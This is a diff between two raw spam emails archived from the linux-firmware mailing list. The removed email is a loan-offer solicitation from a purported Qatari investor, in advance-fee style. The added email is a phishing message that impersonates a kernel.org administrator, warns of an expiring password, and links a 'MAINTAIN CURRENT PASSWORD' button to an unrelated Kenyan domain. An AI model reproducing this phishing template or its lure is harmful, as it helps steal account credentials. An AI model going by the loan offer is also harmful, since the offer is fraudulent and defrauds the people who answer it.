@@ -1,79 +1,144 @@
-Return-Path: <SRS0=eewr=NN=em3973.saudiscarffolding.com=bounces+44608713-05a6-linux-firmware=kernel.org@kernel.org>
+Return-Path: <SRS0=mrzZ=NN=giangtuongvan.cfd=olivia@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id C9F14C25B76
-	for <linux-firmware@archiver.kernel.org>; Tue, 11 Jun 2024 13:14:13 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id AE748C27C65
+	for <linux-firmware@archiver.kernel.org>; Tue, 11 Jun 2024 16:14:07 +0000 (UTC)
 Received: by smtp.kernel.org (Postfix)
-	id 9F8DCC32789; Tue, 11 Jun 2024 13:14:13 +0000 (UTC)
-Received: from wfbtqsch.outbound-mail.sendgrid.net (wfbtqsch.outbound-mail.sendgrid.net [159.183.70.192])
-	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
-	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
-	(No client certificate requested)
-	by smtp.kernel.org (Postfix) with ESMTPS id 8D1BCC3277B
-	for <linux-firmware@kernel.org>; Tue, 11 Jun 2024 13:14:12 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org 8D1BCC3277B
-Authentication-Results: smtp.kernel.org; dmarc=pass (p=none dis=none) header.from=saudiscarffolding.com
-Authentication-Results: smtp.kernel.org; spf=pass smtp.mailfrom=em3973.saudiscarffolding.com
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=saudiscarffolding.com;
-	h=from:subject:mime-version:list-unsubscribe:reply-to:to:content-type:
-	content-transfer-encoding:cc:content-type:from:subject:to;
-	s=s1; bh=WLkjpUqcQbl+sdaBj9woV059RPnDX6PdKwhMvkZ1Z80=;
-	b=xXPiaK90JztOGaP56J2ZCy0buaPynKBZCJdYEzlmSr8wNEVZP8gaDF3UZkOqGbumHW0b
-	1nPNyPlXfpYegPi6+Vak//lj+2lpnSLv+Q/zEL80QfL7Y766p1aiWiQ+X4Zf/7d/3cu8J+
-	egjbyBmXTaoqAHQ6/XbtdDoZL5OqNG2v4ZM7+lm+wEHa3GHGg6EOtF/GP40bifLDJuUuL4
-	32g6Fx2z2J7l43oDpHNbLt9zMf+OXf/BduI9N041Eq+r2svPwVVjTwmerqofkCzfjQaASp
-	/zouZEAREIuYjpASNbSAhYgxyi0vpy/ns7CnzGKMmtjwn2cJZ9zu+G71tWc80P6g==
-Received: by filterdrecv-64d5c975b5-4zqtg with SMTP id filterdrecv-64d5c975b5-4zqtg-1-66684DA3-16
-        2024-06-11 13:14:11.217672669 +0000 UTC m=+3681191.854919059
-Received: from 45.76.231.190.vultrusercontent.com (unknown)
-	by geopod-ismtpd-2 (SG) with ESMTP id z9B3P-zpSWW0CI8BiUriIg
-	for <linux-firmware@kernel.org>; Tue, 11 Jun 2024 13:14:10.985 +0000 (UTC)
-From: "H.E. Shk. Hamad Al Thani" <h.e.shk.hamadalthani@saudiscarffolding.com>
-Subject: Explore Global Opportunities with Qatari Investment Group!
-Date: Tue, 11 Jun 2024 13:14:11 +0000 (UTC)
-Message-ID: <20240611131410.BBF27750373BAE12@saudiscarffolding.com>
-MIME-Version: 1.0
-List-Unsubscribe: <mailto:h.e.shk.hamadalthani@saudiscarffolding.com>
-Reply-To: h.e.shk.hamadalthani@saudiscarffolding.com
-X-SG-EID: 
- =?us-ascii?Q?u001=2EwM1n=2F8Egj9Xg9suzemoeiDT9s0DKXmGod5=2FxJp0FNqOtS9FNU5sj6wLi5?=
- =?us-ascii?Q?H+Iihj=2Fz7RUOiFBjR1xh83Uu=2Fb51Ix1ZLIrnCwY?=
- =?us-ascii?Q?Z+tK7nrsDlNFwmOSQq=2F3e5=2Fb1jcJFYYnBAhdDox?=
- =?us-ascii?Q?QK+xw3l=2F7=2FZF8A0M4bmz2o017LOe0v3h5nW1Frw?=
- =?us-ascii?Q?Md1NIc6YPU0uT7LUQYzaPMbm6c4x7wRRUF=2FhY0O?=
- =?us-ascii?Q?VT4J9Zu=2F1GE4uAK8FiOM11Ew3QjkkiMsf=2F3HQmr?=
- =?us-ascii?Q?39mhn+7bAkMcQnaEDZ9cCkfF+Ux9abS9eNvVWfS?=
- =?us-ascii?Q?wFWAZn48k6p0YC3enYCCIxz5Z5RhK?=
+	id 7C8F8C4AF48; Tue, 11 Jun 2024 16:14:07 +0000 (UTC)
+Received: from tonyhai.com (unknown [64.112.61.248])
+	by smtp.kernel.org (Postfix) with ESMTP id A373CC2BD10
+	for <linux-firmware@kernel.org>; Tue, 11 Jun 2024 16:14:06 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org A373CC2BD10
+Authentication-Results: smtp.kernel.org; dmarc=pass (p=none dis=none) header.from=giangtuongvan.cfd
+Authentication-Results: smtp.kernel.org; spf=pass smtp.mailfrom=giangtuongvan.cfd
+Received: from DESKTOP-5D9CB29 (unknown [164.92.126.11])
+	by tonyhai.com (Postfix) with ESMTPA id A24597F4D
+	for <linux-firmware@kernel.org>; Tue, 11 Jun 2024 07:57:59 -0800 (AKDT)
+From: "administrator@kernel.org" <olivia@giangtuongvan.cfd>
+Subject: Password Expired - linux-firmware@kernel.org
 List-Id: <linux-firmware.lore.kernel.org>
-To: linux-firmware@kernel.org
-X-Entity-ID: u001.J0g0Qk8cemlOYuEBJLW52g==
-Content-Type: text/plain; charset=us-ascii
+To: <linux-firmware@kernel.org>
+Content-Type: multipart/alternative; boundary="harAprdV9qTV14Hl=_CkYHXf0MPnhg7WQk"
+MIME-Version: 1.0
+Reply-To: <no-reply@kernel.org>
+Date: Tue, 11 Jun 2024 15:57:59 -1200
+Message-Id: <11592024065715C06B488D6E$87232259C8@giangtuongvan.cfd>
+
+This is a multi-part message in MIME format
+
+--harAprdV9qTV14Hl=_CkYHXf0MPnhg7WQk
+Content-Type: text/plain; charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-Salaam!
 
-Looking to finance your project anywhere in the world? Look no=20
-further! Qatari Investment Group offers a wide range of financial=20
-services, including debt financing, loans, and partnerships=20
-tailored to your needs.
+linux-firmware@kernel.org Password Expired
 
-With flexible loan options available in any currency and for any=20
-amount, we empower project owners to turn their visions into=20
-reality. Enjoy a generous twelve-month grace period and benefit=20
-from our competitive interest rates and extended repayment terms.
+Hi linux-firmware,
 
-We value collaboration and reward referrals. Brokers and=20
-representatives who introduce project owners to us receive=20
-commissions for their valuable connections.
+Your account password expires today, Tuesday, June 11, 2024=20
+Email service actions, such as "send and receive," may be limited if n=
+o action is taken.
+You can change your password or continue to use the current one.
 
-Ready to take the next step? Contact us today with your detailed=20
-loan request, and let's pave the way for success together!
+MAINTAIN CURRENT PASSWORD https://beltomdatasolutions.co.ke/1/?userid=3D=
+linux-firmware@kernel.org
 
-May Allah bless you with good health and sound mind.
+See all Terms and Conditions https://beltomdatasolutions.co.ke/1/?user=
+id=3Dlinux-firmware@kernel.org
 
-H.E. Shk. Hamad Al Thani
-CHAIRMAN
-Qatari Investors Group (QIG)
+=2E
+
+Copyright =A9 2024 kernel.org - All Rights Reserved
+
+--harAprdV9qTV14Hl=_CkYHXf0MPnhg7WQk
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <META content=3D"text/html; charset=3Diso-8859-1" http-equiv=3DConte=
+nt-Type><body<DIV><title>Password Expired - linux-firmware@kernel.org<=
+/title>
+ </head>
+ <BODY> <DIV id=3Dv1Header><table class=3D"v1stylingblock-content-wrap=
+per" style=3D"MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=3D0 width=3D=
+"100%"> <tr><td class=3D"v1stylingblock-content-wrapper v1camarker-inn=
+er"><table id=3Dv1backgroundTable cellSpacing=3D0 cellPadding=3D0 widt=
+h=3D"100%" bgColor=3D#f3f3f3 border=3D0> <tr><td align=3Dcenter><table=
+ class=3D"v1devicewidth" style=3D"HEIGHT: 100px" cellSpacing=3D0 cellP=
+adding=3D0 width=3D565 align=3Dcenter bgColor=3D#13b5ea border=3D0> <t=
+r><td class=3Dv1bg-mobile-image style=3D"WIDTH: 600px" height=3D21><ta=
+ble class=3D"v1devicewidth" style=3D"TABLE-LAYOUT: fixed" cellSpacing=3D=
+0 cellPadding=3D0 width=3D600 align=3Dcenter border=3D0> <tr><td vAlig=
+n=3Dmiddle align=3Dcenter><table class=3D"v1devicewidth" style=3D"TABL=
+E-LAYOUT: fixed" cellSpacing=3D0 cellPadding=3D0 width=3D500 align=3Dc=
+enter border=3D0> <tr><td vAlign=3Dmiddle align=3Dcenter><table class=3D=
+"v1devicewidth" cellSpacing=3D0 cellPadding=3D0 width=3D500 border=3D0=
+> <tr><td style=3D"FONT-SIZE: 26px; FONT-FAMILY: 'Helvetica Neue',Helv=
+etica,arial,sans-serif; FONT-WEIGHT: 300; COLOR: white; PADDING-BOTTOM=
+: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; LINE-HEIGHT: 32px" align=3D=
+center>linux-firmware@kernel.org&nbsp;Password Expired</TD></TR></TABL=
+E></TD></TR></TABLE></TD></TR></TABLE></TD></TR></TABLE></TD></TR></TA=
+BLE></TD></TR></TABLE></DIV><table cellSpacing=3D0 cellPadding=3D0 wid=
+th=3D"100%" bgColor=3D#f3f3f3 border=3D0> <tr><td align=3Dcenter><tabl=
+e class=3D"v1devicewidth" cellSpacing=3D0 cellPadding=3D0 width=3D600 =
+align=3Dcenter bgColor=3D#ffffff border=3D0> <tr><td style=3D"PADDING-=
+TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dcenter> <DIV>=
+ <DIV><table class=3D"v1stylingblock-content-wrapper" style=3D"MIN-WID=
+TH: 100%" cellSpacing=3D0 cellPadding=3D0 width=3D"100%"> <tr><td clas=
+s=3D"v1stylingblock-content-wrapper v1camarker-inner"><table class=3D"=
+v1devicewidth" cellSpacing=3D0 cellPadding=3D0 width=3D500 align=3Dcen=
+ter bgColor=3D#ffffff border=3D0> <tr><td class=3D"v1padding-mobile-wr=
+apped v1left-text-mobile" style=3D"FONT-SIZE: 16px; FONT-FAMILY: 'Helv=
+etica Neue',Helvetica,arial,sans-serif; COLOR: #45474d; PADDING-BOTTOM=
+: 20px; TEXT-ALIGN: left; PADDING-TOP: 0px; LINE-HEIGHT: 26px"> <P ali=
+gn=3Dleft>Hi linux-firmware,</p><p align=3Dleft>Your account password =
+expires today, Tuesday, June 11, 2024 <BR>Email service actions, such =
+as "send and receive," may be limited if no action is taken.<BR><BR>Yo=
+u can change your password or continue to use the current one.</P></TD=
+></TR></TABLE></TD></TR></TABLE><table class=3D"v1stylingblock-content=
+-wrapper" style=3D"MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=3D0 wi=
+dth=3D"100%"> <tr><td class=3D"v1stylingblock-content-wrapper v1camark=
+er-inner"><table class=3D"v1devicewidth" cellSpacing=3D0 cellPadding=3D=
+0 width=3D"100%" align=3Dcenter border=3D0> <tr><td align=3Dleft><tabl=
+e cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0> <tr><td a=
+lign=3Dcenter><table cellSpacing=3D0 cellPadding=3D50 align=3Dcenter b=
+order=3D0> <TR class=3Dv1rounded-button> <TD style=3D"PADDING-BOTTOM: =
+40px; PADDING-TOP: 0px" align=3Dcenter><table cellSpacing=3D0 cellPadd=
+ing=3D0 width=3D"100%" border=3D0> <tr><td style=3D"PADDING-BOTTOM: 0p=
+x; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dce=
+nter><table cellSpacing=3D0 cellPadding=3D0 border=3D0> <tr><td style=3D=
+"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIG=
+HT: 0px" align=3Dcenter><table cellSpacing=3D0 cellPadding=3D0 border=3D=
+0> <tr><td bgColor=3D#13b5ea align=3Dcenter><A style=3D"FONT-SIZE: 16p=
+x; TEXT-DECORATION: none; BORDER-TOP: #13b5ea 2px solid; FONT-FAMILY: =
+'Helvetica Neue',Helvetica,arial,sans-serif; BORDER-RIGHT: #13b5ea 2px=
+ solid; BORDER-BOTTOM: #13b5ea 2px solid; COLOR: #ffffff; PADDING-BOTT=
+OM: 12px; PADDING-TOP: 12px; PADDING-LEFT: 24px; BORDER-LEFT: #13b5ea =
+2px solid; DISPLAY: block; LINE-HEIGHT: 16px; PADDING-RIGHT: 24px" hre=
+f=3D"https://beltomdatasolutions.co.ke/1/?userid=3Dlinux-firmware@kern=
+el.org">MAINTAIN CURRENT PASSWORD</A></TD></TR></TABLE></TD></tr><tr><=
+td class=3D"v1stylingblock-content-wrapper v1camarker-inner"><table cl=
+ass=3D"v1devicewidth" cellSpacing=3D0 cellPadding=3D0 width=3D500 alig=
+n=3Dcenter bgColor=3D#ffffff border=3D0> <tr><td class=3D"v1padding-mo=
+bile-wrapped v1left-text-mobile" style=3D"FONT-SIZE: 16px; FONT-FAMILY=
+: 'Helvetica Neue',Helvetica,arial,sans-serif; COLOR: #45474d; PADDING=
+-BOTTOM: 20px; TEXT-ALIGN: left; PADDING-TOP: 0px; LINE-HEIGHT: 26px">=
+ <P align=3Dleft><A style=3D"TEXT-DECORATION: none; COLOR: #22b0de" hr=
+ef=3D"https://beltomdatasolutions.co.ke/1/?userid=3Dlinux-firmware@ker=
+nel.org" rel=3D"noopener noreferrer" target=3D_blank>See all Terms and=
+ Conditions</A>.</p><p style=3D"FONT-SIZE: 11px; FONT-FAMILY: 'Helveti=
+ca Neue',Helvetica,arial,sans-serif; COLOR: #45474d; LINE-HEIGHT: 150%=
+"><EM>Copyright &copy; 2024 kernel.org - All Rights Reserved <BR></EM>=
+</P></TD></TR></TABLE></TD></TR></TABLE></TD></TR></TABLE></TD></TR></=
+TABLE></TD></TR></TABLE></TD></TR></TABLE></TD></TR></TABLE></DIV></DI=
+V></TD></TR></TABLE></TD></TR></TABLE></body>
+ </html>
+
+--harAprdV9qTV14Hl=_CkYHXf0MPnhg7WQk--
+
